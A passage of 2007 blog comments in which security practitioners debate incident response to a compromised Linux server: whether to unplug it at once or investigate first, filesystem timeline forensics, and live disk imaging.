<p>&#8220;But it&#8217;s too bad you&#8217;re not willing to engage in a reasonable discussion about it.&#8221;</p>
<p>It&#8217;s the word &#8220;reasonable&#8221; as used by you (my dear troll) that is the problem.</p>
<p>You want to argue by analogy.</p>
<p>You want to claim that the admins are too dumb to suspect 10 boxes wiping themselves would be &#8230; odd.</p>
<p>You do not want a &#8220;reasonable discussion&#8221;. You want to troll this forum.</p>
<p>You want to &#8220;discuss&#8221; Hollywood Coincidences and Movie Plot Threats as if they were real.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67533">

			<div class="comment by-xrey ">

				<p class="commentcredit">

					<span class="commenter">xrey</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67533">
						August 17, 2007 12:28 PM					</a>

				</p>

				<p>@Todd Knarr:</p>
<p>I agree that there is much to be said for watching a cracker and giving him enough rope to hang himself. However, I&#8217;m thinking about a situation where you have machines with sensitive data (including your credentials to get to other machines). Anything that the cracker downloads, alters, or destroys between time x (compromise discovered) and time x+y (when the network cable is plugged) is a gift to the cracker.</p>
<p>Like I said, you also have to assume that the cracker has had the run of your internal network for some time, so you must also pull the network cables for machines in your sub-network or department.</p>
<p>Obviously IBM is not going to pull their T1 to their corporate headquarters for one compromised box, but any user with an account on that box might now be an attack vector.</p>
<p>As for the techinical question of leaving the machine powered-on or powered-off, I&#8217;ll defer to the expertise of forensic pros. Antibozo makes a strong case for leaving it on.</p>
<p>At the time of discovery, you only have one data point: this machine has a backdoor and will respond to commands issued by an attacker. If you remove the network cable, it can no longer respond to commands.</p>
<p>If you leave it connected then you are responsible for any commands that get through. Whether the cracker noticed your observation or he just happened to issue a command between x and x+y, the result is the same.</p>
<p>There might be a logic bomb set to go off at a specific time, or if it remains off the network for a certain length, but that goes into the real of movie plot threat.</p>
<p>If you really want to be a &#8220;good citizen&#8221; and track down the hacker, then by all means set up a honeypot without any sensitive data. Even better, set up a virtualized clone of your cracked box and perform a man-in-the-middle attack against the cracker, taking care of what you allow to be sent back.</p>
<p>From my perspective, my priority is protecting data, so any sensitive data should be quarantined. The priority of an incident response team or a three-letter-agency might be to catch the hacker.</p>
<p>Also, it&#8217;s easy to be taken in by the &#8220;rookie mistakes&#8221; made by the cracker and become over confident. What if the crack is in fact professional industrial espionage made to look like a common script kiddie botnet?</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67534">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67534">
						August 17, 2007 1:01 PM					</a>

				</p>

				<p>Pat Calahan&gt; I don&#8217;t do any adminning from any box that runs services.</p>
<p>Oh, good. And you don&#8217;t ssh into any box that runs services with X11 forwarding enabled either, right? ;^)</p>
<p>Pat Calahan&gt; If a machine is compromised, saying &#8220;you should always do this [list]&#8221; vs &#8220;you should always do this other [list]&#8221; isn&#8217;t the argument you should be having.</p>
<p>I know it&#8217;s a lot of noise to slog through, but I think you&#8217;ll find that if you go back and read everything I&#8217;ve written above, you won&#8217;t find me saying you should always do anything in particular; rather you&#8217;ll see that my position is that there are always exceptional circumstances and that no single course of action is necessarily correct in every case. In other words, [always] think, and try to observe, before acting.</p>
<p>Pat Calahan&gt; You&#8217;re arguing a predominantly forensic standpoint, Brandioch is arguing a predominantly preventative standpoint, but you both have good ideas that may be more appropriate given the context.</p>
<p>I think that&#8217;s not accurate&#8211;I&#8217;m arguing a containment-driven standpoint, not a forensic one. The overarching context here is a Linux compromise, which may thus involve a box used to conduct remote admin functions, thus containing the incident may involve a lot of other systems.</p>
<p>The first operational goal in a compromise is containment, and the first step toward that goal is not necessarily pulling the network cable on the box you know about. That would be a greedy algorithm approach, and, as I&#8217;m sure you know, with complex problems, greedy algorithms are not always the most efficient. In some cases it can lead to a nasty game of whack-a-mole. You&#8217;ll win in the end, one way or another, but if it takes a week instead of a day to contain, and a month instead of a week for the syadmins to recover (because they have to reinstall more systems), that&#8217;s a lot of time wasted that could have been spent on preventing the next compromise.</p>
<p>Pat Calahan&gt; You may have the router logs, and already know what traffic has been coming from the box. You may know that the box was running a web service with a PHP backend and already have a pretty good idea how the box was hacked, even if you don&#8217;t know the specific details.</p>
<p>If you already have that kind of knowledge, indeed, you have a lot less to do on the compromised box before acting. Again, all I&#8217;m saying is, &#8220;take some time to understand the situation before acting&#8221;.</p>
<p>Pat Calahan&gt; Using a log host helps a lot</p>
<p>Hear! Hear!</p>
<p>Pat Calahan&gt; You may be in a race for time to prevent the box from attacking other things inside your DMZ, if the box has access to your management net.</p>
<p>Definitely&#8211;you&#8217;re always in a race for time. But until you investigate, you don&#8217;t know where your opponent is in that race. There&#8217;s no point running a leg of the race you&#8217;ve already lost. If the intruder already got onto your management net and has his sticky little paws on all your switches and servers, there&#8217;s really no point in unplugging the network cable of the one box&#8211;you may need to go for the jugular at that point and hit a kill switch on the whole computer room. And if you&#8217;re going to have to do that, you may not want to give the attacker any lead time by taking finger-in-the-dike measures beforehand.</p>
<p>A lot of intruders are slow and unfocused. Some of them are lousy typists, and are running five network scans in parallel with working on your box and a dozen others. There&#8217;s even a reasonable chance the intruder is asleep at the time the compromise is discovered. If you&#8217;re focused and swift, you have a decent chance of finding out everything you need to know while the intruder does nothing of significance, and as long as he is unaware you&#8217;re working on the problem, he has no reason to hurry.</p>
<p>I should also clarify, as I think others have misconstrued my comments, that I&#8217;m not generally advocating delaying action in order to observe the intruder&#8217;s activity to try to learn more about his behavior and whereabouts; rather I&#8217;m arguing that you <em>may</em> wish to delay action until you&#8217;ve had a chance to survey your own systems, starting with the compromised box you know about, to understand the full scope of your compromise, so you can perform an instantaneous containment, closing all the doors at the same time. Sometimes this is a good idea and sometimes it isn&#8217;t, and experience helps judgment, but don&#8217;t rule it out just because someone told you to always pull the network cable immediately on a compromised box.</p>
<p>As Bugs Bunny would say, &#8220;It&#8217;s time for a little stragety.&#8221;</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67535">

			<div class="comment by-todd-knarr ">

				<p class="commentcredit">

					<span class="commenter">Todd Knarr</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67535">
						August 17, 2007 1:06 PM					</a>

				</p>

				<p>xrey: yes, you can assume the intruder&#8217;s had the run of your internal network. But how much? Which other machines has he compromised? How did he compromise them, and how&#8217;s he accessing them now? One of the worst situations to be in is to obviously slam the door on the one machine you knew about, giving the intruder solid confirmation that you found him, only to find out a week later about the 2 other machines he&#8217;d compromised that you didn&#8217;t notice the first time. Before you had an intruder, now you have an intruder out to teach you a lesson.</p>
<p>Yes, he may have downloaded data. But how much? Has he already downloaded everything, meaning there&#8217;s no more data at risk locally? Or has he spent all his time gaining further access and not gone looking locally for sensitive data? In those cases, the data most at risk may not be on a machine affected by your shutting down the machine you&#8217;ve found compromised.</p>
<p>And your last is exactly correct. That&#8217;s one of the reasons my first reaction is to not do anything. I approach any evidence I find asking &#8220;Is this something the intruder wanted me to find? And if it is, why?&#8221;. If I were an intruder, one thing I&#8217;d want to set up is a tripwire (or several) to tell me if some nosy sysadmin&#8217;s started poking around where he shouldn&#8217;t be.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67536">

			<div class="comment by-pat-cahalan ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://padraic2112.wordpress.com' rel='external nofollow ugc' class='url'>Pat Cahalan</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67536">
						August 17, 2007 1:18 PM					</a>

				</p>

				<blockquote><p>
  Oh, good. And you don&#8217;t ssh into any box that runs services with X11 forwarding<br />
  enabled either, right? ;^)
</p></blockquote>
<p>Brrr&#8230; X11 forwarding makes my skin crawl.  Have you been reading my blog?</p>
<blockquote><p>
  But until you investigate, you don&#8217;t know where your opponent is in that race.<br />
  There&#8217;s no point running a leg of the race you&#8217;ve already lost.
</p></blockquote>
<p>Sure, I&#8217;ve just seen people forget what race they&#8217;re actually running.  One anecdote involves a sysadmin of my acquaintance spending the lion&#8217;s share of two weeks digging into a compromised host searching for forensics clues, when we already knew that the box in question hadn&#8217;t done anything to any other boxes (yay for the router logs there), and the real question of precisely how it got hacked was moot -&gt; it was running about four known-to-be exploitable services.  Who cared exactly why it was exploited?  We weren&#8217;t going to redeploy it in that state anyway ðŸ™‚  Sure, he got a lot of intellectual satisfaction out of the exercise, but there were other (more pressing) things he ought to have been working on.</p>
<blockquote><p>
  I should also clarify, as I think others have misconstrued my comments, that I&#8217;m<br />
  not generally advocating delaying action in order to observe the intruder&#8217;s activity to<br />
  try to learn more about his behavior and whereabouts; rather I&#8217;m arguing that<br />
  you <em>may</em> wish to delay action
</p></blockquote>
<p>Sounds like we&#8217;re both actually on about the same page, we just both wrote posts that weren&#8217;t clear enough in the first place ðŸ™‚</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67537">

			<div class="comment by-xrey ">

				<p class="commentcredit">

					<span class="commenter">xrey</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67537">
						August 17, 2007 1:59 PM					</a>

				</p>

				<p>@Todd Knarr:</p>
<p>I agree with just about everything you said; it&#8217;s very important to figure out how he cracked your system, how far he got, etc.</p>
<p>However, I disagree that the best method is to let him crack your system even more. I think the best method is forensic analysis of the dis-connected machine or from its image.</p>
<p>We have to use classic cost/benefit analysis to determine how many other machines we must also disconnect. The cracker now knows about all the machines listed in &#8220;/etc/hosts&#8221; so that&#8217;s probably a good place to start.</p>
<p>Forensics takes time, so we&#8217;ll have to do a cost/benefit analysis of how much effort we want to put into answering which questions.</p>
<p>This may take weeks. If that&#8217;s unacceptable, then I hope we set up backup systems ahead of time.</p>
<p>When the first machine gets disconnected you have a finite time to do the rest, but I don&#8217;t think it&#8217;s as short a fuse as some make it to be. After all, single machines go down all the time for all the normal reasons.</p>
<p>People on this board smarter than me have pointed out that you need to have these procedures worked out ahead of time. If I have a hand in crafting the procedures, my vote is that it should say &#8220;pull the network cable of the compromised machine and any machine within radius R as soon as a compromise is detected.&#8221;</p>
<p>I am skeptical that even the most &#8220;733t&#8221; sysadmin can watch a compromised machine without letting the cracker know he is watching and prevent the cracker from doing more damage. How many processes can a sysadmin monitor at once?</p>
<p>And if my sysadmin(s) are busy playing spy-vs-spy over Machine A, they could miss the fact that the user credentials stolen via a key-logger from Machine A have now just logged into Machines B, C, and D which have all just opened up outboard connections&#8230;.</p>
<p>If the cracker set up a trip-wire, how is he going to know I&#8217;m poking around on un-plugged machines?</p>
<p>I&#8217;ll leave it up to others more knowledgable than myself to address the legal questions:<br />
1) Is a system which you left on-line and manipulated after compromise detection now inadmissable as evidence?<br />
2) If I decide to leave the machine connected, am I legally liable for proprietary information stolen after detection (hospital records, etc.)?</p>
<p>Of course, information that is literally &#8220;Secret&#8221; in the DoD sense is never put on externally connected computers in the first place. Government agencies have rules for handling Classified information&#8211;assuming you belong to one of the three normal branches of government (I&#8217;m looking at you, Cheney).</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67538">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67538">
						August 17, 2007 2:43 PM					</a>

				</p>

				<p>xrey&gt; This may take weeks.</p>
<p>With any decent organization, it&#8217;s on the order of two or three hours from discovery to analysis of the first box, and from there another hour to hit a dozen or so more with one sysadmin working on that part of the problem in coordination with an incident responder. But you can double those times if the sysadmin yoinked the network cable before calling, and triple them if he rebooted.</p>
<p>The majority of the initial time is the sysadmin contacting the incident response team, the team getting the admin up to speed on procedures, downloading tools, etc. In parallel with that is discussion with sysadmins and managers about the network architecture and determining current critical service placement and downtime tolerance so that as the scope is narrowed down, the containment procedure can be ready to go in short order.</p>
<p>It will never, ever, take weeks to contain. Assuming proper staffing, two days at the outside for a complex system that provides life-and-property functions hence has stringent downtime requirements, and that may involve partial containment at a much earlier mark. On most other scenarios, three to four hours to contain, on the short side if the vector is found quickly.</p>
<p>xrey&gt; Is a system which you left on-line and manipulated after compromise detection now inadmissable as evidence?</p>
<p>Criminal cases are extremely rare, and the objective in a criminal investigation is not necessarily containment of the compromise; it&#8217;s establishment of sufficient evidence to conduct a prosecution. This may be inimical to containment and is really a whole issue unto itself. I suggest you take a look at NIST 800-86, &#8220;Guide to Integrating Forensic Techniques into Incident Response&#8221;, as a starting point, though, if you&#8217;re interested. You might want to compare the forensic process discussed there with the incident response life cycle discussed in NIST 800-61, &#8220;Computer Security Incident Handling Guide&#8221;.</p>
<p>xrey&gt; if my sysadmin(s) are busy playing spy-vs-spy over Machine A, they could miss the fact that the user credentials stolen via a key-logger from Machine A have now just logged into Machines B, C, and D which have all just opened up outboard connections&#8230;.</p>
<p>If your sysadmins are busy playing whack-a-mole logging into B, C, and D to check for illegitimate logins (which may have been wiped out of wtmp), they could miss the fact that the .bash_history file on A shows the attacker logging into E, F, and G, and the fact that the attacker logged into A from 192.168.1.1 and your router logs show connections to the ssh port on H, I, and J from that same IP, and the fact that the attacker initially got into A using a vulnerability in service S, and K, L, and M are all running that service as well. If you don&#8217;t have incident responders who can figure out those things from A rapidly, yes, a scattershot approach may be your only option, but rest assured that plenty of organizations have capable incident response teams.</p>
<p>xrey&gt; If I decide to leave the machine connected, am I legally liable for proprietary information stolen after detection (hospital records, etc.)?</p>
<p>If you decide to disconnect the machine, are you legally liable for proprietary information stolen at an increased rate from other systems because you just told the intruder he has to finish his task as quickly as possible?</p>
<p>Really, if legal liability in the type of scenario you&#8217;re talking about is your concern, your best ass-covering strategy is to down every external connection at your perimeter and kill power on every box, damn the consequences.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67539">

			<div class="comment by-xrey ">

				<p class="commentcredit">

					<span class="commenter">xrey</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67539">
						August 17, 2007 4:33 PM					</a>

				</p>

				<p>antibozo&gt; &#8220;It will never, ever, take weeks to contain.&#8221;</p>
<p>It did at my last job! A *NIX box was cracked in an adjacent group. The decision was made to unplug every *NIX box in the whole department. This caused an immediate work stoppage because most of us needed the network to function.</p>
<p>Dozens of Engineers sitting on their hands for a couple of weeks resulted in millions of dollars of lost productivity. It helps if you&#8217;re employer has deep pockets!</p>
<p>But more bureaucracy also means more higher-ups putting in their requirements.</p>
<p>These weren&#8217;t mission-critical boxes, to be sure, or else there would have been a back-up in place.</p>
<p>Each box had to be scanned for vulnerabilities, all patches had to be up-to-date, and everyone had to change all their passwords.</p>
<p>In the interim, at least we were sure that the none of our machines were spilling any data that hadn&#8217;t been compromised already. It was a drastic decision, but I had to admit it was the right one. And it sure was a wake-up call for everyone.</p>
<p>We had to assume that the compromised Machine A may have been used to crack B, which may have been used to crack C, etc.</p>
<p>However, there was no need to un-plug machines X, Y, and Z in another department, because there were no user accounts overlapping. That doesn&#8217;t mean that IT wasn&#8217;t watching them more closely.</p>
<p>Later I became the sysadmin for my group and shored up a lot of the machines (with guidance from upper level IT).</p>
<p>In the years that I was sysadmin, we were never cracked again, and it wasn&#8217;t from lack of trying. We detected attempted connections over every port and IP Address at least once a month.</p>
<p>Either I was such a good administrator that I made our boxes impenetrable, or I was so inept that I didn&#8217;t realize when we were cracked ðŸ˜‰</p>
<p>But if any of my machines had been cracked, I would not have hesitated to un-plug all my boxes from the network.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67540">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67540">
						August 17, 2007 8:32 PM					</a>

				</p>

				<p>@xrey</p>
<p>I have to agree with you. Unplugging is best. Immediately, if at all possible.</p>
<p>And you&#8217;ll notice that &#8220;antibozo&#8221; has changed his position from:<br />
paraphrased: &#8220;unplugging will destroy your machines&#8221;<br />
to<br />
paraphrased: &#8220;unplugging will reduce the amount of information you can gather&#8221;.</p>
<p>With the unstated assumption that losing that block of information will be more harmful to you in some way than allowing the cracked box to remain in his control.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67541">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67541">
						August 18, 2007 12:53 AM					</a>

				</p>

				<p>xrey, that&#8217;s a pretty brutal story, and you have my sympathy. But technically, the weeks of downtime you suffered were eradication and recovery, not containment. Containment happened when all those boxes were disconnected (or at least, one hopes so). In any case, it sounds like you got some useful knowledge out of the experience.</p>
<p>I really recommend you take a look at NIST 800-61. It covers a lot of the issues we&#8217;ve discussed here, and may put your experience in perspective. You can find the NIST 800 documents here:</p>
<p><a href="http://csrc.nist.gov/publications/nistpubs/" rel="nofollow ugc">http://csrc.nist.gov/publications/nistpubs/</a></p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67542">

			<div class="comment by-supersaurus ">

				<p class="commentcredit">

					<span class="commenter">supersaurus</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67542">
						August 18, 2007 7:17 PM					</a>

				</p>

				<p>tools question:  there are tools, e.g. tripwire, you can run to find out what happened in the filesystem.   leaving aside the shutdown/pull the plug or not argument,  do you use things like that at some point in the investigation (yes, I know, it matters how, where and when you set up the database and how you do the checks)?</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67543">

			<div class="comment by-supersaurus ">

				<p class="commentcredit">

					<span class="commenter">supersaurus</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67543">
						August 18, 2007 7:19 PM					</a>

				</p>

				<p>for the original poster:  did you ever find out how the cracker got in?</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67544">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67544">
						August 18, 2007 8:29 PM					</a>

				</p>

				<p>supersaurus&gt; tools question: there are tools, e.g. tripwire, you can run to find out what happened in the filesystem. leaving aside the shutdown/pull the plug or not argument, do you use things like that at some point in the investigation (yes, I know, it matters how, where and when you set up the database and how you do the checks)?</p>
<p>For the most part tools like tripwire are used for either detecting a compromise or trying to recover a system after containment without reinstallation (rarely advisable, but sometimes necessary). They are not as useful for figuring out what really happened; they tell you that a file has been modified, but not when.</p>
<p>What is more useful during initial investigation are tools that build a chronology of filesystem activity, e.g. TCT/sleuthkit mactime. This mode of investigation is not foolproof because it is possible for an intruder to tweak timestamps deliberately, but this is very rare in practice, at least nowadays. A filesystem chronology helps you correlate intrusion activity with logs, both on and off the system, and shell history files, and gives you a rough idea of the sequence of actions the intruder performed. It also gives you an approximate time at which the intrusion began, and may be useful for developing signatures for checking for intrusion on other hosts. For example, if the first thing the intruder did was use wget to pull down a toolkit, and no one else uses wget regularly, you can check the last access time of the wget binary on all your systems to build a list of suspect systems that should be initial candidates for further investigation and possible containment. Timestamps also help when dealing with password sniffers; the last access time of the sniffer log usually tells you the last time the intruder looked at it, and passwords logged before that time are thus more suspect than those logged later.</p>
<p>Chronology tools are only useful, however, if the timestamps are pristine at the time they are collected, which is why timestamp collection is something that should happen as soon after detection of a compromise as possible. Every time a user does an ls, executes a binary, accesses a config file, etc., last access timestamps get changed. Normal activity can quickly erode the access chronology from the filesystem, making investigation significantly more difficult. If the sysadmin tracks down a sniffer log and cats it before collecting last access times, evidence of what the intruder knows is destroyed. Timestamps may also be reset by backups, cron jobs (the updatedb process that builds the fast find database for the locate command, for example), patching, and especially a reboot. A system that has been rebooted after initial compromise is a lot harder to analyze.</p>
<p>Of course, the ability to build a useful chronology is severely hampered by unsynchronized clocks. It&#8217;s important to measure the clock skew on a system during initial investigation so that timestamps can be adjusted to correlate with the rest of the world, and it&#8217;s an important practice for all sysadmins to keep system clocks synchronized. NTP is your friend.</p>
<p>If you&#8217;re interested in this field, download sleuthkit and play with it. See if you can independently construct a timeline of recent activity on your box as an exercise.</p>
<p><a href="http://www.sleuthkit.org/" rel="nofollow ugc">http://www.sleuthkit.org/</a></p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67545">

			<div class="comment by-gopi ">

				<p class="commentcredit">

					<span class="commenter">Gopi</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67545">
						August 19, 2007 12:12 PM					</a>

				</p>

				<p>Does it really take that long to pull the plug, rip out the drive, image it, and put it back in and turn the machine back on, if you want to avoid tipping the person off?</p>
<p>If imaging would take too long, I just thought of a cool piece of hardware somebody should build. It would do a man-in-the-middle on your IDE or SATA bus. It would do a block copy as fast as possible, while passing through read requests from the CPU. If there was a write request, it would read and store the original block first.</p>
<p>Another idea would be to take advantage of sleep mode. If you can configure your desktop to do a full write system state to disk sleep, you can pull off all the system state for analysis when you do a block image of the drive.</p>
<p>Finally, FireWire has some interesting direct DMA options. You can use it to read and write arbitrary memory; this can be done without the OS kernel&#8217;s approval if the firewire hardware&#8217;s permissions are set the &#8220;right&#8221; (&#8220;wrong&#8221;?) way. You could likely build up some interesting forensics tools that didn&#8217;t involve the remote kernel knowing what was up. I believe the FreeBSD has FireWire kernel debugging which will work even if the kernel has fallen over and died.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67546">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67546">
						August 19, 2007 12:36 PM					</a>

				</p>

				<p>Gopi&gt; Does it really take that long to pull the plug, rip out the drive, image it, and put it back in and turn the machine back on, if you want to avoid tipping the person off?</p>
<p>Yes, in general, especially with modern disks. A 300GB disk takes 50 minutes to image at 100MB/s, which is a generous transfer rate. And killing the box means throwing away lots of volatile information and completely disrupting the environment both for the system and the intruder. In contrast, collecting file metadata on a similar-sized disk would typically only take 5-10 minutes and cause no disruption.</p>
<p>Furthermore, the incident handler is often working remotely from the compromised system, so getting a disk image to the handler for analysis may be constrained by network bandwidth, and talking the sysadmin through the necessary steps can be iffy.</p>
<p>Gopi&gt; If imaging would take too long, I just thought of a cool piece of hardware somebody should build. It would do a man-in-the-middle on your IDE or SATA bus. It would do a block copy as fast as possible, while passing through read requests from the CPU. If there was a write request, it would read and store the original block first.</p>
<p>Satisfactory live disk imaging for non-evidentiary purposes can be accomplished with dd and netcat, and doesn&#8217;t require taking the system down. On LVM systems, snapshots can be used to maintain consistency. In cases where you have a hot-pluggable server with RAID 1, you can do an instantaneous image without killing the box by failing one side of the mirror and pulling the disk. These are sometimes useful tactics, but again, from an initial investigation standpoint, the priority is a good filesystem chronology, and it&#8217;s usually a lot faster and less resource-intensive to collect file metadata on the live box than work with an image.</p>
<p>I believe devices similar to what you describe exist, however.</p>
<p>Your other suggestions about sleep mode and firewire are interesting. As far as sleep mode, I don&#8217;t believe I&#8217;ve ever seen a Linux server that implements a hibernation mode, but I can see it being workable with Windows laptops. I don&#8217;t do much investigation on Windows, so maybe someone else can comment.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67547">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67547">
						August 19, 2007 4:42 PM					</a>

				</p>

				<p>@Gopi<br />
&#8220;Does it really take that long to pull the plug, rip out the drive, image it, and put it back in and turn the machine back on, if you want to avoid tipping the person off?&#8221;</p>
<p>Does it even matter? &#8220;antibozo&#8217;s&#8221; original position was that the cracker would destroy other systems if he should become aware that you are aware of his activity.</p>
<p>&#8220;antibozo&#8221; has since abandoned that position.</p>
<p>&#8220;Another idea would be to take advantage of sleep mode. If you can configure your desktop to do a full write system state to disk sleep, you can pull off all the system state for analysis when you do a block image of the drive.&#8221;</p>
<p>Yep. But the question is whether the information you gain from such would be that much more useful than the information gained through just searching the hard drive after you shut down the box.</p>
<p>It&#8217;s called &#8220;analysis paralysis&#8221;.</p>
<p>You have to keep your eyes on the final goal. Will that information change the approach you&#8217;ll be taking? Would the lack of that information result in your failure to attain that goal?</p>
<p>In every case you&#8217;ll run into you&#8217;ll have a pretty good idea of how the cracker got in after you run a few basic checks.</p>
<p>After that it&#8217;s just a question of what data he had access to and what other machines inside your operation could he have attacked.</p>
<p>Don&#8217;t waste your time over-thinking this. Digging through a few gigabytes of data (RAM dump + files) that won&#8217;t change your course of action is not an effective use of your time.</p>
<p>Instead, think through the various scenarios now. Know how your systems can be attacked and how you&#8217;d detect that (and prevent it) now.</p>
<p>If a system does get cracked, how quickly would your detection system alert you? Can you automatically isolate that system from your others?</p>
<p>Etc.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67548">

			<div class="comment by-armchair-expert ">

				<p class="commentcredit">

					<span class="commenter">Armchair &#039;expert&#039;</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67548">
						August 22, 2007 10:28 PM					</a>

				</p>

				<p>Hey Folks,</p>
<p>I&#8217;m nothing but an armchair security expert (perhaps &#8220;security enthusiast&#8221; is a better term) but I&#8217;ve found this discussion interesting.</p>
<p>I feel those of you arguing against Antibozo should re-read his posts.  Consider the logic of them.</p>
<p>From what I read he&#8217;s not arguing for heroic detective work, but that any action should be considered and weighed based on your own situation.  (Perhaps he&#8217;s arguing against a default reaction?)</p>
<p>An example:</p>
<p>If you do First Aid here in Australia you&#8217;d learn the &#8220;DRABC&#8221; acronym.</p>
<p>Danger<br />
Response<br />
Airway<br />
Breathing<br />
Circulation</p>
<p>Notice that the first thing to do by the acronym is &#8216;Danger&#8217;.</p>
<p>In other words you need to do some kind of assessment of the danger in any situation before acting.  In the First Aid situation you don&#8217;t want to get yourself hurt when trying to help somebody else.</p>
<p>So, consider the bigger picture I guess, don&#8217;t rush and make a poor decision which at worse, could possibly make the situation worse (A cracker &#8220;race&#8221;, other boxes compromised, perhaps your whole organisation down or even some kind of logic bomb!)</p>
<p>Thanks,</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67549">

			<div class="comment by-eric-windisch ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://www.vpsvillage.com' rel='external nofollow ugc' class='url'>Eric Windisch</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67549">
						August 24, 2007 1:41 PM					</a>

				</p>

				<p>I deal with cracked machines fairly frequently, being involved in web hosting.  Our customers are responsible for their own security, and are not always vigilent.  (We protect ourselves with various network security measures, but thats another matter)</p>
<p>Virtual machines have significantly affected how we deal with these things.  We run Xen and use LVM on Linux.  From our host, we can create disk snapshots and examine the filesystem without the guest OS being shutdown or aware.  We do this not just for hacked hosts, but to handle DMCA and spam complaints.</p>
<p>In fact, when possible, we snapshot the filesystem, investigate, then alert the intruder inviting him to &#8220;clean up&#8221;!  Afterwards, we perform a filesystem comparison, to see if there was anything we missed on the initial investigation.</p>
<p>Of course there are things that can only be done from inside the running guest, and we&#8217;re  hoping that some new intraspection tools, such as  being involved in web hosting.  Our customers are responsible for their own security, and are not always vigilent.  (We protect ourselves with various network security measures, but thats another matter)</p>
<p>Virtual machines have significantly affected how we deal with these things.  We run Xen and use LVM on Linux.  From our host, we can create disk snapshots and examine the filesystem without the guest OS being shutdown or aware.  We do this not just for hacked hosts, but to handle DMCA and spam complaints.</p>
<p>In fact, when possible, we snapshot the filesystem, investigate, then alert the intruder inviting him to &#8220;clean up&#8221;!  Afterwards, we perform a filesystem comparison, to see if there was anything we missed on the initial investigation.</p>
<p>Of course there are things that can only be done from inside the running guest, and we&#8217;re  hoping that some new intraspection tools currently in development, such as XenKIMODO, that will allow greater security analysis from our hosts.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

	<p class="subscribe-comments">
		<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/feed/">
			<img alt="Atom Feed" src="https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/images/rss.png">
			Subscribe to comments on this entry		</a>
	</p>

		<div id="respond" class="comment-respond">
